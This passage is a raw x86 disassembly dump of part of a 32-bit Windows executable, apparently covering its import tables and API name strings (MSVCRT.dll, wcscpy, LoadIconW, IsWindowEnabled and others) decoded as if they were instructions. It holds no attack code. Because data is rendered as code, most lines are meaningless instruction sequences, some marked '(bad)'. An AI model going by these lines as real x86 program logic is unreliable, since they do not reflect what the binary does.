  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
